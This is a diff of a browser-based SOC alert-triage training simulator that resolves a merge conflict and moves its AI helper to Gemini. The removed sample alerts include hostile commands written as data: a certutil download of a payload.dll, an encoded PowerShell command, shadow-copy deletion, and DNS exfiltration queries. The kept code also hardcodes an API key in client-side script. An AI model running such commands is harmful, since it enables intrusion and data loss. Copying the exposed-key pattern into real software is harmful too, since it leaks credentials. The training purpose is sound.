@@ -1,106 +1,12 @@
-
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Syne:wght@400;500;700&display=swap');
-  *{box-sizing:border-box;margin:0;padding:0;}
-  #soc-root{font-family:'Syne',var(--font-sans);background:#0a0e17;color:#c9d1e0;min-height:600px;border-radius:var(--border-radius-lg);overflow:hidden;display:flex;flex-direction:column;}
-  .soc-header{background:#0d1220;border-bottom:1px solid #1e2a3a;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;}
-  .soc-brand{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;color:#4fc3f7;letter-spacing:.08em;}
-  .soc-status{display:flex;gap:16px;align-items:center;}
-  .status-dot{width:7px;height:7px;border-radius:50%;background:#4caf50;animation:pulse-dot 2s infinite;}
-  @keyframes pulse-dot{0%,100%{opacity:1;}50%{opacity:.4;}}
-  .score-badge{font-family:'JetBrains Mono',monospace;font-size:12px;color:#4fc3f7;background:rgba(79,195,247,.1);border:1px solid rgba(79,195,247,.25);padding:3px 10px;border-radius:4px;}
-  .soc-body{display:grid;grid-template-columns:260px 1fr;flex:1;min-height:560px;}
-  .alert-sidebar{background:#0d1220;border-right:1px solid #1e2a3a;overflow-y:auto;padding:12px 0;}
-  .sidebar-label{font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.12em;color:#4a5568;padding:0 14px 8px;text-transform:uppercase;}
-  .alert-item{padding:10px 14px;cursor:pointer;border-left:3px solid transparent;transition:all .15s;position:relative;}
-  .alert-item:hover{background:rgba(255,255,255,.03);}
-  .alert-item.active{background:rgba(79,195,247,.06);border-left-color:#4fc3f7;}
-  .alert-item.res-tp{border-left-color:#ef5350;opacity:.6;}
-  .alert-item.res-fp{border-left-color:#66bb6a;opacity:.6;}
-  .alert-severity{font-size:10px;font-family:'JetBrains Mono',monospace;font-weight:600;letter-spacing:.06em;margin-bottom:3px;}
-  .sev-critical{color:#ef5350;}.sev-high{color:#ffa726;}.sev-medium{color:#ffee58;}.sev-low{color:#66bb6a;}
-  .alert-title-short{font-size:12px;color:#c9d1e0;line-height:1.4;font-weight:500;}
-  .alert-type-tag{font-size:10px;color:#4a5568;margin-top:3px;font-family:'JetBrains Mono',monospace;}
-  .res-mark{font-size:10px;font-family:'JetBrains Mono',monospace;position:absolute;right:10px;top:10px;}
-  .main-panel{display:flex;flex-direction:column;overflow:hidden;}
-  .alert-detail{padding:20px;flex:1;overflow-y:auto;}
-  .detail-title{font-family:'Syne',sans-serif;font-size:16px;font-weight:700;color:#e8edf5;margin-bottom:4px;}
-  .detail-meta{font-size:12px;color:#4a5568;font-family:'JetBrains Mono',monospace;margin-bottom:16px;}
-  .data-table{background:#0d1220;border:1px solid #1e2a3a;border-radius:8px;overflow:hidden;margin-bottom:14px;}
-  .data-table-header{background:#111827;padding:8px 14px;font-size:11px;font-family:'JetBrains Mono',monospace;color:#4a5568;letter-spacing:.1em;text-transform:uppercase;border-bottom:1px solid #1e2a3a;}
-  .data-row{display:flex;padding:7px 14px;border-bottom:1px solid rgba(30,42,58,.5);font-size:12px;font-family:'JetBrains Mono',monospace;gap:12px;}
-  .data-row:last-child{border-bottom:none;}
-  .data-key{color:#4a8aba;min-width:120px;flex-shrink:0;}
-  .data-val{color:#c9d1e0;word-break:break-all;}
-  .data-val.suspicious{color:#ef5350;font-weight:600;}
-  .ai-panel{background:#080c14;border:1px solid rgba(79,195,247,.2);border-radius:8px;margin-bottom:14px;overflow:hidden;}
-  .ai-panel-header{background:rgba(79,195,247,.07);padding:10px 14px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(79,195,247,.15);}
-  .ai-icon{width:18px;height:18px;background:rgba(79,195,247,.2);border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0;}
-  .ai-label{font-size:11px;font-family:'JetBrains Mono',monospace;color:#4fc3f7;font-weight:600;letter-spacing:.08em;text-transform:uppercase;}
-  .ai-mode-badge{margin-left:auto;font-size:10px;font-family:'JetBrains Mono',monospace;color:#4a5568;background:rgba(255,255,255,.04);padding:2px 8px;border-radius:4px;border:1px solid #1e2a3a;}
-  .ai-body{padding:14px;}
-  .ai-loading{display:flex;align-items:center;gap:8px;font-size:12px;font-family:'JetBrains Mono',monospace;color:#4a5568;}
-  .ai-spinner{width:14px;height:14px;border:2px solid #1e2a3a;border-top-color:#4fc3f7;border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0;}
-  @keyframes spin{to{transform:rotate(360deg);}}
-  .ai-verdict-row{display:flex;align-items:center;gap:10px;margin-bottom:10px;}
-  .verdict-chip{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;padding:4px 12px;border-radius:4px;letter-spacing:.06em;}
-  .verdict-tp{background:rgba(239,83,80,.15);color:#ef5350;border:1px solid rgba(239,83,80,.3);}
-  .verdict-fp{background:rgba(102,187,106,.12);color:#66bb6a;border:1px solid rgba(102,187,106,.3);}
-  .verdict-uncertain{background:rgba(255,167,38,.12);color:#ffa726;border:1px solid rgba(255,167,38,.3);}
-  .confidence-bar-wrap{flex:1;background:#1e2a3a;border-radius:3px;height:6px;overflow:hidden;}
-  .confidence-bar{height:100%;border-radius:3px;transition:width .8s ease;}
-  .conf-high{background:#ef5350;}.conf-med{background:#ffa726;}.conf-low{background:#66bb6a;}
-  .confidence-label{font-size:11px;font-family:'JetBrains Mono',monospace;color:#4a5568;min-width:40px;text-align:right;}
-  .ai-reasoning{font-size:13px;color:#8892a4;line-height:1.6;margin-bottom:12px;}
-  .ai-indicators{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px;}
-  .indicator-tag{font-size:11px;font-family:'JetBrains Mono',monospace;padding:3px 9px;border-radius:4px;border:1px solid;}
-  .ind-suspicious{color:#ef5350;border-color:rgba(239,83,80,.3);background:rgba(239,83,80,.07);}
-  .ind-neutral{color:#ffa726;border-color:rgba(255,167,38,.3);background:rgba(255,167,38,.07);}
-  .ind-ok{color:#66bb6a;border-color:rgba(102,187,106,.3);background:rgba(102,187,106,.07);}
-  .ai-question{background:rgba(79,195,247,.05);border:1px solid rgba(79,195,247,.15);border-radius:6px;padding:10px 12px;margin-bottom:10px;}
-  .ai-question p{font-size:13px;color:#a8c7e0;margin-bottom:8px;line-height:1.5;}
-  .ai-q-buttons{display:flex;flex-wrap:wrap;gap:6px;}
-  .ai-q-btn{font-size:11px;font-family:'JetBrains Mono',monospace;color:#4fc3f7;background:rgba(79,195,247,.08);border:1px solid rgba(79,195,247,.2);border-radius:4px;padding:5px 10px;cursor:pointer;transition:all .15s;}
-  .ai-q-btn:hover{background:rgba(79,195,247,.15);}
-  .verdict-section{border-top:1px solid #1e2a3a;padding:16px 20px;display:flex;gap:10px;align-items:center;background:#0a0e17;}
-  .verdict-label{font-size:12px;font-family:'JetBrains Mono',monospace;color:#4a5568;margin-right:4px;}
-  .verdict-btn{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;padding:8px 18px;border-radius:5px;cursor:pointer;transition:all .15s;letter-spacing:.04em;}
-  .btn-tp{background:rgba(239,83,80,.15);color:#ef5350;border:1px solid rgba(239,83,80,.35);}
-  .btn-tp:hover{background:rgba(239,83,80,.25);}
-  .btn-fp{background:rgba(102,187,106,.12);color:#66bb6a;border:1px solid rgba(102,187,106,.3);}
-  .btn-fp:hover{background:rgba(102,187,106,.2);}
-  .btn-escalate{background:rgba(255,167,38,.1);color:#ffa726;border:1px solid rgba(255,167,38,.25);}
-  .btn-escalate:hover{background:rgba(255,167,38,.18);}
-  .result-overlay{position:absolute;inset:0;background:rgba(10,14,23,.94);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:10;border-radius:8px;gap:10px;}
-  .result-title{font-family:'JetBrains Mono',monospace;font-size:18px;font-weight:600;}
-  .result-sub{font-size:13px;color:#8892a4;font-family:'JetBrains Mono',monospace;text-align:center;max-width:300px;line-height:1.5;}
-  .explain-block{background:rgba(79,195,247,.04);border:1px solid rgba(79,195,247,.12);border-radius:6px;padding:10px 14px;font-size:12px;color:#7a8fa8;line-height:1.6;font-family:'JetBrains Mono',monospace;max-width:340px;text-align:center;}
-  .result-next{font-family:'JetBrains Mono',monospace;font-size:12px;color:#4fc3f7;background:rgba(79,195,247,.1);border:1px solid rgba(79,195,247,.25);padding:8px 18px;border-radius:5px;cursor:pointer;margin-top:6px;transition:all .15s;}
-  .result-next:hover{background:rgba(79,195,247,.18);}
-  .no-alert{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:12px;color:#2a3548;}
-  .no-alert-text{font-family:'JetBrains Mono',monospace;font-size:13px;}
-  .progress-row{display:flex;gap:8px;padding:8px 20px;background:#0d1220;border-top:1px solid #1e2a3a;align-items:center;}
-  .prog-item{font-size:11px;font-family:'JetBrains Mono',monospace;color:#4a5568;}
-  .prog-item span{font-weight:600;color:#c9d1e0;}
-<<<<<<< HEAD
-
-  /* Finish screen */
-  #finish-screen{display:none;position:fixed;inset:0;background:rgba(10,14,23,.97);align-items:center;justify-content:center;z-index:200;font-family:'Syne',sans-serif;}
-  #finish-screen.visible{display:flex;}
-  .finish-card{background:#0d1220;border:1px solid #1e2a3a;border-radius:16px;padding:48px 40px;width:480px;max-width:92vw;text-align:center;}
-  .finish-logo{font-family:'JetBrains Mono',monospace;font-size:11px;color:#4a5568;letter-spacing:.12em;text-transform:uppercase;margin-bottom:20px;}
-  .finish-grade{font-size:28px;font-weight:700;letter-spacing:.04em;margin-bottom:6px;}
-  .finish-score-big{font-family:'JetBrains Mono',monospace;font-size:52px;font-weight:600;line-height:1;margin-bottom:4px;}
-  .finish-score-label{font-family:'JetBrains Mono',monospace;font-size:12px;color:#4a5568;margin-bottom:28px;}
-  .finish-stats{display:flex;justify-content:center;gap:24px;margin-bottom:32px;}
-  .finish-stat{background:#080c14;border:1px solid #1e2a3a;border-radius:8px;padding:14px 20px;min-width:80px;}
-  .finish-stat-val{font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:600;color:#c9d1e0;}
-  .finish-stat-key{font-family:'JetBrains Mono',monospace;font-size:10px;color:#4a5568;text-transform:uppercase;letter-spacing:.1em;margin-top:4px;}
-  .finish-btn{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;padding:12px 32px;border-radius:6px;cursor:pointer;transition:all .15s;letter-spacing:.06em;background:rgba(79,195,247,.12);border:1px solid rgba(79,195,247,.3);color:#4fc3f7;}
-  .finish-btn:hover{background:rgba(79,195,247,.22);}
-  .finish-btn:disabled{opacity:.45;cursor:not-allowed;}
-  .finish-regen{font-family:'JetBrains Mono',monospace;font-size:12px;color:#4a5568;margin-top:12px;min-height:20px;display:flex;align-items:center;justify-content:center;gap:8px;}
-</style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SOC//AI — Alert Triage Simulator</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
 
 <div id="finish-screen">
   <div class="finish-card">
@@ -127,15 +33,6 @@
   </div>
 </div>
 
-<h2 class="sr-only">SOC Analyst AI Training Simulator — triage security alerts as true positive or false positive with live Gemini AI augmentation</h2>
-=======
-  .ai-stream{font-size:13px;color:#8892a4;line-height:1.7;white-space:pre-wrap;font-family:'JetBrains Mono',monospace;}
-  .cursor-blink{display:inline-block;width:7px;height:13px;background:#4fc3f7;animation:blink .7s steps(1) infinite;vertical-align:text-bottom;margin-left:2px;}
-  @keyframes blink{50%{opacity:0;}}
-</style>
-
-<h2 class="sr-only">SOC Analyst AI Training Simulator — triage security alerts as true positive or false positive with live Claude AI augmentation</h2>
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
 <div id="soc-root">
   <div class="soc-header">
     <div class="soc-brand">SOC//AI — Alert Triage Simulator</div>
@@ -167,18 +64,10 @@
 </div>
 
 <script>
-<<<<<<< HEAD
-// ─────────────────────────────────────────────────────────────────────────────
-// IMPORTANT: Replace the value below with your free Google Gemini API key.
-// Get one free (no credit card) at: aistudio.google.com → Get API key
-// This key is embedded here so visitors can use the app without signing in.
-// ─────────────────────────────────────────────────────────────────────────────
 const GEMINI_KEY = 'AIzaSyA4fUEDUylWhT6Ud7fszzGYQFutPmTqvbw';
 
 let ALERTS = [];
 let state = {selected:null, resolved:{}, score:0, total:0, aiData:{}, aiLoading:{}};
-
-// ── Gemini API helper ─────────────────────────────────────────────────────────
 
 async function callGemini(systemText, userText) {
   const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`;
@@ -197,8 +86,6 @@ async function callGemini(systemText, userText) {
   if (!text) throw new Error('Empty response from Gemini');
   return text;
 }
-
-// ── Alert generation ──────────────────────────────────────────────────────────
 
 async function generateAlertsWithGemini() {
   const raw = await callGemini(
@@ -227,14 +114,12 @@ Return a JSON array of 8 objects, each with EXACTLY these fields:
   "explanation": <1-2 sentence educational note shown after the answer is revealed>
 }
 
-For fields: "s":true marks suspicious/anomalous fields. TP alerts should have 2-4 suspicious fields; clean FP alerts may have 0-1. Use creative, varied, realistic details — no repeated attack patterns.`
+For fields: "s":true marks suspicious/anomalous fields. TP alerts should have 2-4 suspicious fields; clean FP alerts may have 0-1. Use creative, varied, realistic details.`
   );
   const parsed = JSON.parse(raw);
   if (!Array.isArray(parsed) || parsed.length === 0) throw new Error('Invalid alert data received');
   return parsed;
 }
-
-// ── Initialise / restart ──────────────────────────────────────────────────────
 
 function renderLoadingState() {
   document.getElementById('alert-sidebar').innerHTML = `
@@ -279,8 +164,6 @@ async function restartSimulator() {
   await initSimulator();
 }
 
-// ── Per-alert AI analysis ─────────────────────────────────────────────────────
-
 function callGeminiAPI(alertId) {
   const a = ALERTS.find(x => x.id === alertId);
   if (!a) return;
@@ -288,7 +171,6 @@ function callGeminiAPI(alertId) {
   renderDetail();
 
   const fieldText = a.fields.map(f => `  ${f.k}: ${f.v}${f.s?' [FLAGGED]':''}`).join('\n');
-
   const modeInstructions = {
     verdict: `Give a definitive verdict. Return JSON: {"verdict":"TP" or "FP","confidence":<0-100>,"reasoning":"<2-3 sentences>","indicators":[{"text":"<label>","type":"suspicious|neutral|ok"}]} — 3-6 indicators.`,
     indicators: `Highlight suspicious indicators without a final verdict. Return JSON: {"verdict":"REVIEW","confidence":<0-100>,"reasoning":"<2-3 sentences>","indicators":[{"text":"<label>","type":"suspicious|neutral|ok"}]} — 4-7 indicators.`,
@@ -310,8 +192,6 @@ function callGeminiAPI(alertId) {
   });
 }
 
-// ── Finish screen ─────────────────────────────────────────────────────────────
-
 function showFinishScreen() {
   const total = ALERTS.length;
   const pct = Math.round((state.score / total) * 100);
@@ -320,7 +200,6 @@ function showFinishScreen() {
   const vals = Object.values(state.resolved);
   const tpMarked = vals.filter(r => r.verdict === 'TP' || r.verdict === 'ESCALATE').length;
   const fpMarked = vals.filter(r => r.verdict === 'FP').length;
-  const wrong = total - state.score;
 
   document.getElementById('finish-grade').textContent = grade;
   document.getElementById('finish-grade').style.color = gradeColor;
@@ -329,13 +208,11 @@ function showFinishScreen() {
   document.getElementById('finish-score-label').textContent = `${pct}% accuracy`;
   document.getElementById('fin-tp').textContent = tpMarked;
   document.getElementById('fin-fp').textContent = fpMarked;
-  document.getElementById('fin-wrong').textContent = wrong;
+  document.getElementById('fin-wrong').textContent = total - state.score;
   document.getElementById('finish-regen').textContent = '';
   document.getElementById('finish-restart-btn').disabled = false;
   document.getElementById('finish-screen').classList.add('visible');
 }
-
-// ── Rendering ─────────────────────────────────────────────────────────────────
 
 function renderSidebar() {
   const el = document.getElementById('alert-sidebar');
@@ -347,64 +224,6 @@ function renderSidebar() {
     if (r) cls += a.answer === 'FP' ? ' res-fp' : ' res-tp';
     const mark = r ? `<span class="res-mark" style="color:${r.correct?'#66bb6a':'#ef5350'}">${r.correct?'✓':'✗'}</span>` : '';
     el.innerHTML += `<div class="${cls}" onclick="selectAlert(${a.id})">
-=======
-const ALL_ALERTS = [
-  {id:1,type:"Phishing Email",severity:"HIGH",answer:"TP",title:"Suspicious login-verification email",ts:"2025-04-17 08:34:12 UTC",src:"Email Gateway",
-   fields:[{k:"From",v:"security-noreply@micros0ft-accounts.com",s:true},{k:"To",v:"j.harris@acmecorp.com",s:false},{k:"Subject",v:"Urgent: Verify your Microsoft account",s:false},{k:"Reply-To",v:"collect2024@proton.me",s:true},{k:"SPF",v:"FAIL",s:true},{k:"DKIM",v:"FAIL",s:true},{k:"Link",v:"http://micros0ft-login.xyz/auth",s:true}],
-   aiMode:"verdict",explanation:"Classic phishing: typosquatted domain + auth failures + credential link. AI weights SPF/DKIM failures heavily — real analysts must always hover links before clicking."},
-  {id:2,type:"Malware / Endpoint",severity:"CRITICAL",answer:"TP",title:"PowerShell encoded payload from Word",ts:"2025-04-17 09:11:45 UTC",src:"EDR — WIN-HR-042",
-   fields:[{k:"Process",v:"powershell.exe",s:false},{k:"Parent",v:"WINWORD.EXE",s:true},{k:"Command",v:"powershell -enc JABjACAA...mQAKAA==",s:true},{k:"User",v:"svc_hr_reporting",s:false},{k:"Network",v:"195.43.12.7:4444 (outbound)",s:true},{k:"File write",v:"C:\\Users\\Public\\svchosts.exe",s:true}],
-   aiMode:"indicators",explanation:"Word spawning PowerShell = nearly always malicious. Base64 + C2 + file drop = confirmed compromise. AI flags each indicator independently — the analyst chains them."},
-  {id:3,type:"Network Anomaly",severity:"MEDIUM",answer:"FP",title:"Unusual data transfer to GCP IP",ts:"2025-04-17 10:02:31 UTC",src:"SIEM — Firewall",
-   fields:[{k:"Source IP",v:"10.10.5.88 (dev-build-01)",s:false},{k:"Destination",v:"34.120.144.5 (GCP)",s:false},{k:"Volume",v:"4.2 GB in 18 min",s:true},{k:"Protocol",v:"HTTPS (443)",s:false},{k:"Time",v:"10:00–10:18 UTC (business hours)",s:false},{k:"User agent",v:"gsutil/5.27",s:false}],
-   aiMode:"question",explanation:"AI correctly expresses uncertainty. Large transfers to cloud aren't inherently malicious. Analyst must check CI/CD logs — AI augments, not replaces, that context."},
-  {id:4,type:"Suspicious Login / IAM",severity:"HIGH",answer:"TP",title:"Impossible travel — Chicago to Tokyo",ts:"2025-04-17 11:47:03 UTC",src:"IdP / Okta",
-   fields:[{k:"User",v:"m.chen@acmecorp.com",s:false},{k:"Auth #1",v:"Chicago, IL — 08:45 UTC",s:false},{k:"Auth #2",v:"Tokyo, JP — 11:47 UTC (3h later)",s:true},{k:"Tokyo IP",v:"103.89.22.14 (VPN exit node)",s:true},{k:"MFA",v:"Push approved",s:false},{k:"Device",v:"Unrecognized fingerprint",s:true}],
-   aiMode:"verdict",explanation:"MFA approval can be a false signal — push fatigue attacks are real. Impossible travel + new device overrides MFA context. AI weights these correctly."},
-  {id:5,type:"Network Anomaly",severity:"LOW",answer:"FP",title:"Internal port scan — authorized scanner",ts:"2025-04-17 13:15:00 UTC",src:"IDS — East segment",
-   fields:[{k:"Source",v:"10.10.1.5 (vuln-scanner-01)",s:false},{k:"Target range",v:"10.10.1.0/24",s:false},{k:"Ports",v:"22, 80, 443, 3389, 8080",s:false},{k:"Tool",v:"Nessus 10.x signature",s:false},{k:"Schedule",v:"Every Tuesday 13:00–14:00 UTC",s:false},{k:"Ticket",v:"CHG-1142 (approved)",s:false}],
-   aiMode:"verdict",explanation:"AI correctly dismisses this as FP with high confidence. Authorized scans = common noise. Shows how AI reduces alert fatigue by recognizing known-good patterns."},
-  {id:6,type:"Malware / Endpoint",severity:"CRITICAL",answer:"TP",title:"Ransomware — mass file encryption active",ts:"2025-04-17 14:52:17 UTC",src:"EDR — FILE-SRV-02",
-   fields:[{k:"Process",v:"svchost32.exe (non-system)",s:true},{k:"File ops",v:"4,800 renames in 90 sec",s:true},{k:"Extension",v:".locked appended to all files",s:true},{k:"Ransom note",v:"DECRYPT_FILES.txt in each dir",s:true},{k:"Shadow copies",v:"vssadmin delete shadows executed",s:true},{k:"Network",v:"None — air-gapped behavior",s:false}],
-   aiMode:"indicators",explanation:"No ambiguity. AI's role: instant detection + recommend isolation. Human role: execute IR plan, notify leadership, contain blast radius."},
-  {id:7,type:"Suspicious Login / IAM",severity:"MEDIUM",answer:"FP",title:"After-hours login — exec traveling",ts:"2025-04-18 02:14:00 UTC",src:"IdP / Azure AD",
-   fields:[{k:"User",v:"cfo@acmecorp.com",s:false},{k:"Time",v:"02:14 UTC (off-hours)",s:true},{k:"Location",v:"London, UK",s:false},{k:"IP",v:"Known corporate VPN",s:false},{k:"Device",v:"Recognized — MacBook Pro",s:false},{k:"Travel record",v:"CFO on London trip (HR confirmed)",s:false}],
-   aiMode:"question",explanation:"AI correctly hesitates — off-hours logins need context. HR travel records resolve the ambiguity. Shows AI requesting human-supplied context before rendering a verdict."},
-  {id:8,type:"Phishing Email",severity:"MEDIUM",answer:"FP",title:"IT helpdesk password reset — internal",ts:"2025-04-18 09:45:22 UTC",src:"Email Gateway",
-   fields:[{k:"From",v:"helpdesk@acmecorp.com",s:false},{k:"SPF",v:"PASS",s:false},{k:"DKIM",v:"PASS",s:false},{k:"Link",v:"https://acmecorp.okta.com/reset",s:false},{k:"Triggered by",v:"User self-requested reset (ticket INC-3341)",s:false},{k:"Header",v:"Sent via internal relay",s:false}],
-   aiMode:"verdict",explanation:"AI identifies this as a legitimate internal password reset. All signals are clean — SPF/DKIM pass, link goes to the real Okta domain, and a ticket backs the request."},
-  {id:9,type:"Malware / Endpoint",severity:"HIGH",answer:"TP",title:"Living-off-the-land — certutil C2 beacon",ts:"2025-04-18 11:03:55 UTC",src:"EDR — WIN-DEV-007",
-   fields:[{k:"Process",v:"certutil.exe",s:true},{k:"Args",v:"-urlcache -split -f http://185.220.101.9/payload.dll",s:true},{k:"Parent",v:"cmd.exe (spawned by msiexec)",s:true},{k:"User",v:"developer_dan",s:false},{k:"Network",v:"185.220.101.9 (Tor exit node)",s:true},{k:"File",v:"payload.dll dropped to %TEMP%",s:true}],
-   aiMode:"indicators",explanation:"LOLBin abuse: certutil downloading from a Tor exit node. msiexec → cmd → certutil is a classic supply-chain-attack chain. AI flags the living-off-the-land pattern."},
-  {id:10,type:"Network Anomaly",severity:"HIGH",answer:"TP",title:"DNS tunneling — high entropy subdomains",ts:"2025-04-18 12:30:44 UTC",src:"DNS Firewall",
-   fields:[{k:"Source",v:"10.10.8.22 (ACCT-WIN-03)",s:false},{k:"Queries",v:"a3f9xk2.exfil.bad-actor.io, b7m1nz4.exfil.bad-actor.io",s:true},{k:"Volume",v:"840 queries in 10 min",s:true},{k:"Query length",v:"Avg 58 chars (normal < 20)",s:true},{k:"Entropy",v:"High — base64-like subdomains",s:true},{k:"Destination",v:"External unregistered domain",s:true}],
-   aiMode:"verdict",explanation:"DNS tunneling for data exfiltration. High-entropy, long subdomains to an unknown external domain at volume = textbook C2 over DNS. AI recognizes the entropy + volume signature."},
-  {id:11,type:"Suspicious Login / IAM",severity:"CRITICAL",answer:"TP",title:"Service account interactive login",ts:"2025-04-18 14:22:10 UTC",src:"SIEM — Windows Events",
-   fields:[{k:"Account",v:"svc_backup_agent",s:true},{k:"Login type",v:"Interactive (Type 2) — should be Type 5",s:true},{k:"Source",v:"DESKTOP-FINANCE-01",s:true},{k:"Time",v:"14:22 UTC — business hours",s:false},{k:"Last seen",v:"Account dormant for 47 days",s:true},{k:"MFA",v:"Not enrolled (service account)",s:false}],
-   aiMode:"verdict",explanation:"Service accounts should never log in interactively from a user desktop. Dormant + wrong login type + wrong source = attacker using a compromised service account for lateral movement."},
-  {id:12,type:"Phishing Email",severity:"HIGH",answer:"TP",title:"CEO impersonation — wire transfer request",ts:"2025-04-18 15:55:00 UTC",src:"Email Gateway",
-   fields:[{k:"From display",v:"CEO John Smith <jsmith@acmecorp.com>",s:false},{k:"Actual sender",v:"jsmith@acmec0rp.com (typosquat)",s:true},{k:"To",v:"cfo@acmecorp.com",s:false},{k:"Request",v:"Transfer $87,400 to vendor acct today",s:true},{k:"Urgency",v:"Please handle before EOD — I am in meetings",s:true},{k:"SPF",v:"FAIL (external domain)",s:true}],
-   aiMode:"verdict",explanation:"BEC (Business Email Compromise) attack. CEO impersonation + wire transfer + urgency + SPF failure = classic BEC. AI catches the display name vs actual sender mismatch."}
-];
-
-function shuffle(arr){const a=[...arr];for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
-
-const QUEUE_SIZE = 8;
-const ALERTS = shuffle(ALL_ALERTS).slice(0, QUEUE_SIZE);
-
-let state = {selected:null,resolved:{},score:0,total:0,aiData:{},aiLoading:{}};
-
-function renderSidebar(){
-  const el=document.getElementById('alert-sidebar');
-  el.innerHTML='<div class="sidebar-label">Alert Queue ('+ALERTS.length+')</div>';
-  ALERTS.forEach(a=>{
-    const r=state.resolved[a.id];
-    let cls='alert-item';
-    if(state.selected===a.id)cls+=' active';
-    if(r)cls+=a.answer==='FP'?' res-fp':' res-tp';
-    const mark=r?`<span class="res-mark" style="color:${r.correct?'#66bb6a':'#ef5350'}">${r.correct?'✓':'✗'}</span>`:'';
-    el.innerHTML+=`<div class="${cls}" onclick="selectAlert(${a.id})">
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
       <div class="alert-severity sev-${a.severity.toLowerCase()}">${a.severity}</div>
       <div class="alert-title-short">${a.title}</div>
       <div class="alert-type-tag">${a.type}</div>${mark}
@@ -412,7 +231,6 @@ function renderSidebar(){
   });
 }
 
-<<<<<<< HEAD
 function selectAlert(id) {
   state.selected = id;
   renderSidebar();
@@ -435,110 +253,6 @@ function renderDetail() {
   ).join('');
 
   document.getElementById('alert-detail').innerHTML = `
-=======
-function selectAlert(id){
-  state.selected=id;
-  renderSidebar();
-  renderDetail();
-  if(!state.aiData[id]&&!state.aiLoading[id]) callClaudeAPI(id);
-}
-
-function callClaudeAPI(alertId){
-  const a=ALERTS.find(x=>x.id===alertId);
-  if(!a)return;
-  state.aiLoading[alertId]=true;
-  renderDetail();
-
-  const fieldText=a.fields.map(f=>`  ${f.k}: ${f.v}${f.s?' [FLAGGED]':''}`).join('\n');
-
-  const modeInstructions = {
-    verdict: `Respond as a SOC AI analyst giving a definitive verdict. Structure your response as JSON with these exact fields:
-{
-  "verdict": "TP" or "FP",
-  "confidence": <integer 0-100>,
-  "reasoning": "<2-3 sentence explanation>",
-  "indicators": [{"text":"<short label>","type":"suspicious|neutral|ok"}, ...]
-}
-Give 3-6 indicators. Be definitive. JSON only, no markdown.`,
-    indicators: `Respond as a SOC AI analyst highlighting suspicious indicators without giving a final verdict. Structure as JSON:
-{
-  "verdict": "REVIEW",
-  "confidence": <integer 0-100>,
-  "reasoning": "<2-3 sentence explanation of what stands out>",
-  "indicators": [{"text":"<short label>","type":"suspicious|neutral|ok"}, ...]
-}
-Give 4-7 indicators covering suspicious, neutral, and ok signals. JSON only, no markdown.`,
-    question: `Respond as a SOC AI analyst that is uncertain and needs analyst context. Structure as JSON:
-{
-  "verdict": "UNCERTAIN",
-  "confidence": <integer 0-100>,
-  "reasoning": "<2-3 sentence explanation of the ambiguity>",
-  "indicators": [{"text":"<short label>","type":"suspicious|neutral|ok"}, ...],
-  "question": "<one specific yes/no or context question for the analyst>",
-  "options": ["<option 1>", "<option 2>", "<option 3>"]
-}
-Give 2-4 indicators and exactly 3 options. JSON only, no markdown.`
-  };
-
-  const systemPrompt = `You are an AI-powered SOC (Security Operations Center) analyst assistant embedded in a training simulator. You analyze security alerts and provide structured analysis to help human analysts make triage decisions. Always respond with valid JSON only — no preamble, no markdown, no explanation outside the JSON structure.`;
-
-  const userPrompt = `Alert Type: ${a.type}
-Severity: ${a.severity}
-Title: ${a.title}
-Timestamp: ${a.ts}
-Source: ${a.src}
-
-Alert Fields:
-${fieldText}
-
-AI Interaction Mode: ${a.aiMode.toUpperCase()}
-
-${modeInstructions[a.aiMode]}`;
-
-  fetch("https://api.anthropic.com/v1/messages",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      model:"claude-sonnet-4-20250514",
-      max_tokens:1000,
-      system: systemPrompt,
-      messages:[{role:"user",content:userPrompt}]
-    })
-  })
-  .then(r=>r.json())
-  .then(data=>{
-    state.aiLoading[alertId]=false;
-    try{
-      const raw=data.content.map(b=>b.text||'').join('');
-      const clean=raw.replace(/```json|```/g,'').trim();
-      const parsed=JSON.parse(clean);
-      state.aiData[alertId]=parsed;
-    }catch(e){
-      state.aiData[alertId]={error:true,raw:data};
-    }
-    if(state.selected===alertId)renderDetail();
-  })
-  .catch(()=>{
-    state.aiLoading[alertId]=false;
-    state.aiData[alertId]={error:true};
-    if(state.selected===alertId)renderDetail();
-  });
-}
-
-function renderDetail(){
-  const a=ALERTS.find(x=>x.id===state.selected);
-  if(!a){
-    document.getElementById('alert-detail').innerHTML='<div class="no-alert"><div class="no-alert-text">Select an alert to begin</div></div>';
-    return;
-  }
-  const resolved=state.resolved[a.id];
-  document.getElementById('verdict-section').style.display=resolved?'none':'flex';
-  document.getElementById('progress-row').style.display='flex';
-
-  const fieldsHtml=a.fields.map(f=>`<div class="data-row"><span class="data-key">${f.k}</span><span class="data-val ${f.s?'suspicious':''}">${f.v}</span></div>`).join('');
-
-  document.getElementById('alert-detail').innerHTML=`
->>>>>>> b927797ac2e951c6c1f0e2163ac6bf00aa63da38
     <div style="position:relative;">
       <div class="detail-title">${a.title}</div>
       <div class="detail-meta">${a.ts} &nbsp;·&nbsp; ${a.src} &nbsp;·&nbsp; ${a.type}</div>
@@ -547,17 +261,12 @@ function renderDetail(){
         ${fieldsHtml}
       </div>
       ${renderAIPanel(a)}
-<<<<<<< HEAD
